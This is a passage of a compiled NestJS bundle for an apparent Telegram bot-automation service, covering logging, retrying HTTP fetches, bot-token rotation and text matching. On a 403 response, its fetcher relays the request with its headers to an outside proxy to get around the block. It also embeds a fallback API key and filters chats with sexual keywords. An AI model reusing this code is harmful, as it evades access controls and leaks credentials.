                else {
                    this.logger.debug(`${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`);
                }
            });
            res.on('error', (error) => {
                const errorDetails = (0, parseError_1.parseError)(error, process.env.clientId);
                const botsService = (0, utils_1.getBotsServiceInstance)();
                if (!botsService) {
                    this.logger.warn(`BotsService instance not available for notifications`);
                    return;
                }
                botsService.sendMessageByCategory(components_1.ChannelCategory.HTTP_FAILURES, `Error at req for ${originalUrl}\nMessage: ${errorDetails.message}`);
            });
        }
        else {
            if (originalUrl.includes('Video')) {
                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);
            }
        }
        next();
    }
};
exports.LoggerMiddleware = LoggerMiddleware;
exports.LoggerMiddleware = LoggerMiddleware = __decorate([
    (0, common_1.Injectable)()
], LoggerMiddleware);


/***/ }),

/***/ "./src/processListeners.ts":
/*!*********************************!*\
  !*** ./src/processListeners.ts ***!
  \*********************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.setProcessListeners = setProcessListeners;
function setProcessListeners() {
    process.on('unhandledRejection', (reason, promise) => {
        console.error(' Unhandled Rejection at:', promise, 'reason:', reason);
    });
    process.on('uncaughtException', (error) => {
        console.error(' Uncaught Exception:', error.stack || error);
        process.exit(1);
    });
    let isShuttingDown = false;
    const shutdown = (signal) => {
        if (isShuttingDown)
            return;
        isShuttingDown = true;
        console.log(` ${signal} received, shutting down...`);
        process.exit(0);
    };
    process.on('SIGINT', () => shutdown('SIGINT'));
    process.on('SIGTERM', () => shutdown('SIGTERM'));
    process.on('SIGQUIT', () => shutdown('SIGQUIT'));
    process.on('exit', (code) => {
        console.log(` Application closed with exit code ${code}`);
    });
    console.log(" Process listeners set up successfully");
}


/***/ }),

/***/ "./src/utils/bot.service.instance.ts":
/*!*******************************************!*\
  !*** ./src/utils/bot.service.instance.ts ***!
  \*******************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.setBotsServiceInstance = setBotsServiceInstance;
exports.getBotsServiceInstance = getBotsServiceInstance;
let botsServiceInstance = null;
function setBotsServiceInstance(instance) {
    botsServiceInstance = instance;
}
function getBotsServiceInstance() {
    if (!botsServiceInstance) {
        throw new Error('BotsService instance not initialized. Make sure to call setBotsServiceInstance first.');
    }
    return botsServiceInstance;
}


/***/ }),

/***/ "./src/utils/checkMe.utils.ts":
/*!************************************!*\
  !*** ./src/utils/checkMe.utils.ts ***!
  \************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.isIncludedWithTolerance = exports.safeAttemptReverse = void 0;
const obfuscateText_1 = __webpack_require__(/*! ./obfuscateText */ "./src/utils/obfuscateText.ts");
const normalize = (str) => (str || "")
    .toLowerCase()
    .trim()
    .replace(/\s+/g, " ")
    .replace(/[^\p{L}\p{N}@\s]/gu, "")
    .normalize("NFC")
    .replace(/[\u200B\u200C\u200D\u2060\uFEFF]/g, "");
const safeAttemptReverse = (val) => {
    try {
        return (0, obfuscateText_1.attemptReverseFuzzy)(val ?? "") || "";
    }
    catch {
        return "";
    }
};
exports.safeAttemptReverse = safeAttemptReverse;
const isSimilarEnough = (actual, expected) => {
    const normalizedActual = normalize(actual);
    const normalizedExpected = normalize(expected);
    if (normalizedActual === normalizedExpected)
        return true;
    if (normalizedActual.includes(normalizedExpected) || normalizedExpected.includes(normalizedActual))
        return true;
    const longer = normalizedActual.length > normalizedExpected.length ? normalizedActual : normalizedExpected;
    const shorter = normalizedActual.length > normalizedExpected.length ? normalizedExpected : normalizedActual;
    if (longer.length === 0)
        return true;
    const editDistance = levenshteinDistance(normalizedActual, normalizedExpected);
    const similarity = 1 - editDistance / longer.length;
    return similarity >= 0.7;
};
const levenshteinDistance = (str1, str2) => {
    const matrix = Array(str2.length + 1).fill(null).map(() => Array(str1.length + 1).fill(0));
    for (let i = 0; i <= str1.length; i++)
        matrix[0][i] = i;
    for (let j = 0; j <= str2.length; j++)
        matrix[j][0] = j;
    for (let j = 1; j <= str2.length; j++) {
        for (let i = 1; i <= str1.length; i++) {
            const cost = str1[i - 1] === str2[j - 1] ? 0 : 1;
            matrix[j][i] = Math.min(matrix[j][i - 1] + 1, matrix[j - 1][i] + 1, matrix[j - 1][i - 1] + cost);
        }
    }
    return matrix[str2.length][str1.length];
};
const isIncludedWithTolerance = (actual, expected, maxDiff = 2) => {
    if (!expected)
        return true;
    if (!actual)
        return false;
    const normActual = normalize(actual);
    const normExpected = normalize(expected);
    if (normActual.includes(normExpected))
        return true;
    const minLen = Math.max(normExpected.length - maxDiff, 1);
    const maxLen = normExpected.length + maxDiff;
    for (let len = minLen; len <= maxLen; len++) {
        for (let i = 0; i <= normActual.length - len; i++) {
            const substring = normActual.slice(i, i + len);
            if (levenshteinDistance(substring, normExpected) <= maxDiff) {
                return true;
            }
        }
    }
    return false;
};
exports.isIncludedWithTolerance = isIncludedWithTolerance;


/***/ }),

/***/ "./src/utils/common.ts":
/*!*****************************!*\
  !*** ./src/utils/common.ts ***!
  \*****************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.defaultMessages = exports.defaultReactions = void 0;
exports.sleep = sleep;
exports.contains = contains;
exports.toBoolean = toBoolean;
exports.fetchNumbersFromString = fetchNumbersFromString;
exports.areJsonsNotSame = areJsonsNotSame;
exports.mapToJson = mapToJson;
exports.shouldMatch = shouldMatch;
exports.parseObjectToString = parseObjectToString;
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function contains(str, arr) {
    if (typeof str !== 'string' || !Array.isArray(arr) || arr.length === 0)
        return false;
    const normalizedStr = str.trim().toLowerCase();
    return arr.some(element => typeof element === 'string' &&
        element.trim() !== '' &&
        normalizedStr.includes(element.trim().toLowerCase()));
}
function toBoolean(value) {
    if (value === null || value === undefined)
        return false;
    if (typeof value === 'string') {
        const normalizedValue = value.toLowerCase().trim();
        return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';
    }
    if (typeof value === 'number') {
        return value !== 0;
    }
    return value;
}
function fetchNumbersFromString(inputString) {
    if (!inputString)
        return '';
    const regex = /\d+/g;
    const matches = inputString.match(regex);
    return matches ? matches.join('') : '';
}
exports.defaultReactions = Object.freeze([
    '', '', '', '', '', '',
    '', '', '', '', '', '',
    '', '', '', '', '', '',
    '', '', '', '', '', '',
    '', '', '', '', '', '',
    '', '', '', '', '', '',
    '', '', '', '', '',
    '', '', '', '', ''
]);
exports.defaultMessages = Object.freeze([
    "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "10", "11", "12", "13", "14", "15",
    "16", "17", "18", "19", "20", "21"
]);
function areJsonsNotSame(json1, json2) {
    const keysToIgnore = ['id', '_id', 'createdAt', 'updatedAt', 'timestamp', 'time', 'date', 'timeStamp', 'created_at', 'updated_at'];
    const MAX_DEPTH = 10;
    function compare(obj1, obj2, path = '', depth = 0) {
        if (depth > MAX_DEPTH) {
            console.log(`[DEPTH LIMIT] Reached max depth at path: ${path}`);
            return obj1 !== obj2;
        }
        if (obj1 === null || obj1 === undefined || obj2 === null || obj2 === undefined) {
            if (obj1 !== obj2) {
                console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);
                return true;
            }
            return false;
        }
        if (typeof obj1 !== typeof obj2) {
            console.log(`[MISMATCH] ${path}: type ${typeof obj1} !== ${typeof obj2}`);
            return true;
        }
        if (typeof obj1 !== 'object') {
            if (obj1 !== obj2) {
                console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);
                return true;
            }
            return false;
        }
        if (Array.isArray(obj1) && Array.isArray(obj2)) {
            if (obj1.length !== obj2.length) {
                console.log(`[MISMATCH] ${path}: array length ${obj1.length} !== ${obj2.length}`);
                return true;
            }
            for (let i = 0; i < obj1.length; i++) {
                const arrayPath = path ? `${path}[${i}]` : `[${i}]`;
                if (compare(obj1[i], obj2[i], arrayPath, depth + 1)) {
                    return true;
                }
            }
            return false;
        }
        if (Array.isArray(obj1) || Array.isArray(obj2)) {
            console.log(obj1, obj2);
            console.log(`[MISMATCH] ${path}: one is array, other is not`);
            return true;
        }
        const record1 = obj1;
        const record2 = obj2;
        const keys1 = Object.keys(record1).filter(key => !keysToIgnore.includes(key));
        const keys2 = Object.keys(record2).filter(key => !keysToIgnore.includes(key));
        if (keys1.length !== keys2.length) {
            console.log(`[MISMATCH] ${path}: different key count ${keys1.length} !== ${keys2.length}`);
            console.log(`[KEYS] obj1: [${keys1.join(', ')}]`);
            console.log(`[KEYS] obj2: [${keys2.join(', ')}]`);
            return true;
        }
        for (const key of keys1) {
            if (!keys2.includes(key)) {
                console.log(`[MISMATCH] ${path}: key "${key}" missing in obj2`);
                return true;
            }
        }
        for (const key of keys1) {
            const keyPath = path ? `${path}.${key}` : key;
            if (compare(record1[key], record2[key], keyPath, depth + 1)) {
                return true;
            }
        }
        return false;
    }
    const result = compare(json1, json2);
    console.log(`[COMPARISON END] Result: ${result ? 'DIFFERENT' : 'SAME'}`);
    return result;
}
function mapToJson(map) {
    if (!(map instanceof Map)) {
        throw new Error('Input must be a Map instance');
    }
    const obj = {};
    for (const [key, value] of map.entries()) {
        obj[String(key)] = value;
    }
    return obj;
}
function shouldMatch(obj) {
    const regex = /(wife|adult|lanj|chat||||lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i;
    const titleMatch = obj.title && regex.test(obj.title);
    const usernameMatch = obj.username && regex.test(obj.username);
    return !!(titleMatch || usernameMatch);
}
function parseObjectToString(obj) {
    if (typeof obj !== 'object' || obj === null) {
        return 'Invalid input: Not an object';
    }
    let result = '';
    for (const key in obj) {
        if (obj.hasOwnProperty(key)) {
            result += `${key} : ${obj[key]}\n`;
        }
    }
    return result;
}


/***/ }),

/***/ "./src/utils/fetchWithTimeout.ts":
/*!***************************************!*\
  !*** ./src/utils/fetchWithTimeout.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.fetchWithTimeout = fetchWithTimeout;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/utils/common.ts");
const bots_service_1 = __webpack_require__(/*! ../components/bots/bots.service */ "./src/components/bots/bots.service.ts");
const bot_service_instance_1 = __webpack_require__(/*! ./bot.service.instance */ "./src/utils/bot.service.instance.ts");
const DEFAULT_RETRY_CONFIG = {
    maxRetries: 3,
    baseDelay: 500,
    maxDelay: 30000,
    jitterFactor: 0.2,
};
const DEFAULT_NOTIFICATION_CONFIG = {
    enabled: true,
    channelEnvVar: 'httpFailuresChannel',
    timeout: 5000,
};
async function notifyInternal(prefix, errorDetails, config = DEFAULT_NOTIFICATION_CONFIG) {
    if (!config.enabled)
        return;
    prefix = `${prefix} ${process.env.clientId}`;
    try {
        const errorMessage = typeof errorDetails.message === 'string'
            ? errorDetails.message
            : JSON.stringify(errorDetails.message);
        const formattedMessage = errorMessage.includes('ETIMEDOUT')
            ? 'Connection timed out'
            : errorMessage.includes('ECONNREFUSED')
                ? 'Connection refused'
                : (0, parseError_1.extractMessage)(errorDetails?.message);
        console.error(`${prefix}\n${formattedMessage}`);
        if (errorDetails.status === 429)
            return;
        const notificationText = `${prefix}\n\n${formattedMessage}`;
        try {
            const botsService = (0, bot_service_instance_1.getBotsServiceInstance)();
            await botsService.sendMessageByCategory(bots_service_1.ChannelCategory.HTTP_FAILURES, notificationText);
        }
        catch (error) {
            console.error('Failed to send notification:', error.response?.data || error.message || error.code);
        }
    }
    catch (error) {
        console.error('Error in notification process:', error.response?.data || error.message || error.code);
    }
}
const RETRYABLE_NETWORK_ERRORS = [
    'ETIMEDOUT',
    'ECONNABORTED',
    'ECONNREFUSED',
    'ECONNRESET',
    'ERR_NETWORK',
    'ERR_BAD_RESPONSE',
    'EHOSTUNREACH',
    'ENETUNREACH',
];
const RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];
function shouldRetry(error, parsedError) {
    if (axios_1.default.isAxiosError(error)) {
        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {
            return true;
        }
        if (error.message?.toLowerCase().includes('timeout')) {
            return true;
        }
    }
    return RETRYABLE_STATUS_CODES.includes(parsedError.status);
}
function calculateBackoff(attempt, config = DEFAULT_RETRY_CONFIG) {
    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);
    const jitter = Math.random() * (base * config.jitterFactor);
    return Math.floor(base + jitter);
}
async function makeBypassRequest(url, options) {
    const bypassUrl = options.bypassUrl || process.env.bypassURL || '';
    if (!bypassUrl) {
        throw new Error('Bypass URL is not provided');
    }
    const finalBypassUrl = bypassUrl.startsWith('http')
        ? bypassUrl
        : 'https://helper-thge.onrender.com/execute-request';
    const bypassAxios = axios_1.default.create({
        responseType: options.responseType || 'json',
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: options.timeout || 30000,
    });
    const response = await bypassAxios.post(finalBypassUrl, {
        url,
        method: options.method,
        headers: options.headers,
        data: options.data,
        params: options.params,
        responseType: options.responseType,
        timeout: options.timeout,
        followRedirects: options.maxRedirects !== 0,
        maxRedirects: options.maxRedirects,
    }, {
        headers: {
            'Content-Type': 'application/json',
            'x-api-key': process.env.X_API_KEY || 'santoor',
            ...options.headers,
        },
    });
    if (response &&
        (options.responseType === 'arraybuffer' ||
            response.headers['content-type']?.includes('application/octet-stream') ||
            response.headers['content-type']?.includes('image/') ||
            response.headers['content-type']?.includes('audio/') ||
            response.headers['content-type']?.includes('video/') ||
            response.headers['content-type']?.includes('application/pdf'))) {
        response.data = Buffer.from(response.data);
    }
    return response;
}
function parseUrl(url) {
    if (!url || typeof url !== 'string') {
        return null;
    }
    try {
        const parsedUrl = new URL(url);
        return {
            host: parsedUrl.host,
            endpoint: parsedUrl.pathname + parsedUrl.search,
        };
    }
    catch (error) {
        return null;
    }
}
async function fetchWithTimeout(url, options = {}, maxRetries) {
    console.log(`Fetching URL: ${url} with options:`, options);
    if (!url) {
        console.error('URL is empty');
        return undefined;
    }
    const retryConfig = {
        ...DEFAULT_RETRY_CONFIG,
        ...options.retryConfig,
        maxRetries: maxRetries !== undefined
            ? maxRetries
            : options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries,
    };
    const notificationConfig = {
        ...DEFAULT_NOTIFICATION_CONFIG,
        ...options.notificationConfig,
    };
    options.timeout = options.timeout || 30000;
    options.method = options.method || 'GET';
    const urlInfo = parseUrl(url);
    if (!urlInfo) {
        console.error(`Invalid URL: ${url}`);
        return undefined;
    }
    const { host, endpoint } = urlInfo;
    const clientId = process.env.clientId || 'UnknownClient';
    let lastError = null;
    for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {
        const controller = new AbortController();
        const currentTimeout = options.timeout + attempt * 5000;
        const timeoutId = setTimeout(() => {
            try {
                controller.abort();
            }
            catch (abortError) {
                console.error('Error during abort:', abortError);
            }
        }, currentTimeout);
        try {
            const response = await (0, axios_1.default)({
                ...options,
                url,
                signal: controller.signal,
                maxRedirects: options.maxRedirects ?? 5,
                timeout: currentTimeout,
                headers: {
                    'Content-Type': 'application/json',
                    'x-api-key': process.env.X_API_KEY || 'santoor',
                    ...options.headers,
                },
            });
            clearTimeout(timeoutId);
            return response;
        }
        catch (error) {
            clearTimeout(timeoutId);
            lastError = error instanceof Error ? error : new Error(String(error));
            let parsedError;
            try {
                parsedError = (0, parseError_1.parseError)(error, `host: ${host}\nendpoint:${endpoint}`, false);
            }
            catch (parseErrorError) {
                console.error('Error in parseError:', parseErrorError);
                parsedError = {
                    status: 500,
                    message: String(error),
                    error: 'ParseError',
                };
            }
            const message = parsedError.message;
            const isTimeout = axios_1.default.isAxiosError(error) &&
                (error.code === 'ECONNABORTED' ||
                    (message && message.includes('timeout')) ||
                    parsedError.status === 408);
            if (parsedError.status === 403 || parsedError.status === 495) {
                try {
                    const bypassResponse = await makeBypassRequest(url, options);
                    if (bypassResponse) {
                        await notifyInternal(`Successfully Bypassed the request`, { message: `${clientId} host=${host}\nendpoint=${endpoint}` }, notificationConfig);
                        return bypassResponse;
                    }
                }
                catch (bypassError) {
                    let errorDetails;
                    try {
                        const bypassParsedError = (0, parseError_1.parseError)(bypassError, `host: ${host}\nendpoint:${endpoint}`, false);
                        errorDetails = (0, parseError_1.extractMessage)(bypassParsedError);
                    }
                    catch (extractBypassError) {
                        console.error('Error extracting bypass error message:', extractBypassError);
                        errorDetails = String(bypassError);
                    }
                    await notifyInternal(`Bypass attempt failed`, {
                        message: `host=${host}\nendpoint=${endpoint}\n${`msg: ${errorDetails.slice(0, 150)}\nURL: ${url}`}`,
                    }, notificationConfig);
                }
            }
            else {
                if (isTimeout) {
                    await notifyInternal(`Request timeout on attempt ${attempt}`, {
                        message: `${clientId} host=${host}\nendpoint=${endpoint}\ntimeout=${options.timeout}ms`,
                        status: 408,
                    }, notificationConfig);
                }
                else {
                    await notifyInternal(`Attempt ${attempt} failed`, {
                        message: `${clientId} host=${host}\nendpoint=${endpoint}\n${`mgs: ${message.slice(0, 150)}`}`,
                        status: parsedError.status,
                    }, notificationConfig);
                }
            }
            if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {
                const delay = calculateBackoff(attempt, retryConfig);
                console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);
                await (0, common_1.sleep)(delay);
                continue;
            }
            if (attempt >= retryConfig.maxRetries) {
                break;
            }
        }
    }
    try {
        let errorData;
        try {
            if (lastError) {
                const parsedLastError = (0, parseError_1.parseError)(lastError, `${clientId} host: ${host}\nendpoint:${endpoint}`, false);
                errorData = (0, parseError_1.extractMessage)(parsedLastError);
            }
            else {
                errorData = 'Unknown error';
            }
        }
        catch (extractLastError) {
            console.error('Error extracting last error:', extractLastError);
            errorData = String(lastError) || 'Unknown error';
        }
        await notifyInternal(`All ${retryConfig.maxRetries} retries exhausted`, { message: `${errorData.slice(0, 150)}` }, notificationConfig);
    }
    catch (finalError) {
        console.error('Failed to send final error notification:', finalError);
    }
    return undefined;
}


/***/ }),

/***/ "./src/utils/getRandomEmoji.ts":
/*!*************************************!*\
  !*** ./src/utils/getRandomEmoji.ts ***!
  \*************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getRandomEmoji = getRandomEmoji;
exports.getCuteEmoji = getCuteEmoji;
exports.getRandomPetName = getRandomPetName;
function getRandomEmoji() {
    const eroticEmojis = ["", "", "", "", "", "", " ", "", "", "", "", "", "", "", "", "", ""];
    const randomIndex = Math.floor(Math.random() * eroticEmojis.length);
    return eroticEmojis[randomIndex];
}
function getCuteEmoji() {
    const girlishEmojis = [
        "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", ""
    ];
    const randomIndex = Math.floor(Math.random() * girlishEmojis.length);
    return girlishEmojis[randomIndex];
}
function getRandomPetName() {
    const cuteDesiEnglishPetNames = [
        "Cuti", 'Cutie', "Sweety", "Shinny", 'Shiney', "Bubli",
        "Cuddly", "Sparkle", "Hunny", "Twinkle", "Bunni", "Cuppy",
        "Jelly", "Rosy", "Starry", "Dolly",
        "Pinku", "Glitzy", "Chirpy", "Mishu", "Dreamy",
        "Lovely", "Puppy", "Kuttie", "Rinkly", "Bouncy"
    ];
    const randomIndex = Math.floor(Math.random() * cuteDesiEnglishPetNames.length);
    return cuteDesiEnglishPetNames[randomIndex];
}


/***/ }),

/***/ "./src/utils/index.ts":
/*!****************************!*\
  !*** ./src/utils/index.ts ***!
  \****************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.parseError = exports.ppplbot = exports.fetchWithTimeout = void 0;
__exportStar(__webpack_require__(/*! ./common */ "./src/utils/common.ts"), exports);
var fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
Object.defineProperty(exports, "fetchWithTimeout", ({ enumerable: true, get: function () { return fetchWithTimeout_1.fetchWithTimeout; } }));
var logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
Object.defineProperty(exports, "ppplbot", ({ enumerable: true, get: function () { return logbots_1.ppplbot; } }));
var parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
Object.defineProperty(exports, "parseError", ({ enumerable: true, get: function () { return parseError_1.parseError; } }));
__exportStar(__webpack_require__(/*! ./obfuscateText */ "./src/utils/obfuscateText.ts"), exports);
__exportStar(__webpack_require__(/*! ./tg-apps */ "./src/utils/tg-apps.ts"), exports);
__exportStar(__webpack_require__(/*! ./telegram-utils */ "./src/utils/telegram-utils/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./logger */ "./src/utils/logger.ts"), exports);
__exportStar(__webpack_require__(/*! ./bot.service.instance */ "./src/utils/bot.service.instance.ts"), exports);
__exportStar(__webpack_require__(/*! ./getRandomEmoji */ "./src/utils/getRandomEmoji.ts"), exports);
__exportStar(__webpack_require__(/*! ./isPermanentError */ "./src/utils/isPermanentError.ts"), exports);
__exportStar(__webpack_require__(/*! ./readbleTimeDifference */ "./src/utils/readbleTimeDifference.ts"), exports);


/***/ }),

/***/ "./src/utils/isPermanentError.ts":
/*!***************************************!*\
  !*** ./src/utils/isPermanentError.ts ***!
  \***************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports["default"] = isPermanentError;
const common_1 = __webpack_require__(/*! ./common */ "./src/utils/common.ts");
function isPermanentError(errorDetails) {
    const permanentErrors = [
        'SESSION_REVOKED',
        'AUTH_KEY_UNREGISTERED',
        'USER_DEACTIVATED',
        'USER_DEACTIVATED_BAN',
        'FROZEN_METHOD_INVALID',
    ];
    if ((0, common_1.contains)(errorDetails.message, permanentErrors) && !(0, common_1.contains)(errorDetails.message, ['INPUT_USER_DEACTIVATED'])) {
        return true;
    }
    const rawMessage = errorDetails.error?.message || errorDetails.error?.errorMessage;
    if ((0, common_1.contains)(rawMessage, permanentErrors) && !(0, common_1.contains)(errorDetails.message, ['INPUT_USER_DEACTIVATED'])) {
        return true;
    }
    return false;
}


/***/ }),

/***/ "./src/utils/logbots.ts":
/*!******************************!*\
  !*** ./src/utils/logbots.ts ***!
  \******************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getBotToken = getBotToken;
exports.notifbot = notifbot;
exports.ppplbot = ppplbot;
const getBotTokens = () => {
    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
    if (botTokens.length === 0) {
        console.error('No bot tokens configured. Please set BOT_TOKENS environment variable');
        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
    }
    return botTokens;
};
let botTokens = null;
let currentTokenIndex = 0;
const initializeBotTokens = () => {
    if (botTokens === null) {
        botTokens = getBotTokens();
    }
    return botTokens;
};
function getBotToken() {
    return initializeBotTokens()[currentTokenIndex];
}
function notifbot(chatId = process.env.accountsChannel || "-1001801844217", botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}
function ppplbot(chatId = process.env.updatesChannel || '-1001972065816', botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}


/***/ }),

/***/ "./src/utils/logger.ts":
/*!*****************************!*\
  !*** ./src/utils/logger.ts ***!
  \*****************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Logger = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const chalk_1 = __importDefault(__webpack_require__(/*! chalk */ "chalk"));
const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
class Logger extends common_1.Logger {
    constructor(contextFile) {
        let localContext = contextFile;
        try {
            if (contextFile && typeof contextFile === "string") {
                localContext = path_1.default.basename(contextFile, path_1.default.extname(contextFile));
            }
        }
        catch (err) {
            localContext = "Unknown";
        }
        super(localContext);
        chalk_1.default.level = 3;
    }
    writeToFile(line) {
    }
    log(message, data = "") {
        const line = this.formatMessage("LOG", message, this.getLogColors(), data);
        process.stdout.write(line + "\n");
        this.writeToFile(this.stripAnsi(line));
    }
    info(message, data = "") {
        const line = this.formatMessage("INFO", message, this.getInfoColors(), data);
        process.stdout.write(line + "\n");
        this.writeToFile(this.stripAnsi(line));
    }
    error(message, data = "", trace) {
        const line = this.formatMessage("ERROR", message, this.getErrorColors(), data);
        process.stderr.write(line + (trace ? "\n" + chalk_1.default.red.bold(trace) : "") + "\n");
        this.writeToFile(this.stripAnsi(line + (trace ? "\n" + trace : "")));
    }
    warn(message, data = "") {
        const line = this.formatMessage("WARN", message, this.getWarnColors(), data);
        process.stdout.write(line + "\n");
        this.writeToFile(this.stripAnsi(line));
    }
    debug(message, data = "") {
        const line = this.formatMessage("DEBUG", message, this.getDebugColors(), data);
        process.stdout.write(line + "\n");
        this.writeToFile(this.stripAnsi(line));
    }
    verbose(message, data = "") {
        const line = this.formatMessage("VERBOSE", message, this.getVerboseColors(), data);
        process.stdout.write(line + "\n");
        this.writeToFile(this.stripAnsi(line));
    }
    success(message, data = "") {
        const line = this.formatMessage("SUCCESS", message, this.getSuccessColors(), data);
        process.stdout.write(line + "\n");
        this.writeToFile(this.stripAnsi(line));
    }
    getLogColors() {
        return { level: chalk_1.default.green, message: chalk_1.default.green, context: chalk_1.default.cyan.bold };
    }
    getInfoColors() {
        return { level: chalk_1.default.blue, message: chalk_1.default.blue, context: chalk_1.default.blue.bold };
    }
    getErrorColors() {
        return { level: chalk_1.default.red, message: chalk_1.default.red, context: chalk_1.default.red.bold };
    }
    getWarnColors() {
        return { level: chalk_1.default.yellow, message: chalk_1.default.yellow, context: chalk_1.default.yellow.bold };
    }
    getDebugColors() {
        return { level: chalk_1.default.magenta, message: chalk_1.default.grey, context: chalk_1.default.magenta.bold };
    }
    getVerboseColors() {
        return { level: chalk_1.default.gray, message: chalk_1.default.magenta, context: chalk_1.default.white.dim };
    }
    getSuccessColors() {
        return { level: chalk_1.default.greenBright, message: chalk_1.default.green.bold, context: chalk_1.default.green.bold };
    }
    formatMessage(level, message, colors, data) {
        const safeLevel = typeof level === "string" && level.trim() !== "" ? level : "UNKNOWN";
        const safeColors = {
            level: typeof colors?.level === "function" ? colors.level : (txt) => txt,
            message: typeof colors?.message === "function" ? colors.message : (txt) => txt,
        };
        const formattedMessage = message !== undefined && message !== null
            ? this.formatMultiColorMessage(message, safeColors.message)
            : safeColors.message("[EMPTY MESSAGE]");
        const serviceCtx = this.context ? chalk_1.default.yellow(`[${this.context}]`) : "";
        let extraCtx = "";
        if (typeof data === "object" && data !== null) {
            try {
                extraCtx = this.formatObjectMessage(data);
            }
            catch {
                extraCtx = chalk_1.default.red("[Invalid Context Object]");
            }
        }
        else if (typeof data === "string") {
            extraCtx = this.parseColoredContext(data);
        }
        else if (data !== "" && data !== undefined) {
            extraCtx = chalk_1.default.yellow.bold(String(data));
        }
        if (extraCtx)
            extraCtx = " " + extraCtx;
        const levelFormatted = safeColors.level(`[${safeLevel}]`);
        return `${levelFormatted} ${serviceCtx} ${formattedMessage}${extraCtx}`;
    }
    formatMultiColorMessage(message, levelColor) {
        if (typeof message === "object" && message !== null) {
            return "\n" + this.formatObjectMessage(message);
        }
        let formatted = String(message);
        formatted = formatted.replace(/\[([^\]]+)\]/g, chalk_1.default.cyan.bold("[$1]"));
        formatted = formatted.replace(/\*\*([^*]+)\*\*/g, chalk_1.default.white.bold("$1"));
        formatted = formatted.replace(/\*([^*]+)\*/g, chalk_1.default.yellow("$1"));
        return levelColor(formatted);
    }
    formatObjectMessage(obj, indent = 2, seen = new WeakSet()) {
        if (obj === null)
            return chalk_1.default.gray.bold("null");
        if (typeof obj !== "object") {
            if (typeof obj === "string")
                return chalk_1.default.blueBright.bold(`"${obj}"`);
            if (typeof obj === "number")
                return chalk_1.default.yellow.bold(obj);
            if (typeof obj === "boolean")
                return chalk_1.default.magenta.bold(obj);
            return chalk_1.default.cyanBright.bold(String(obj));
        }
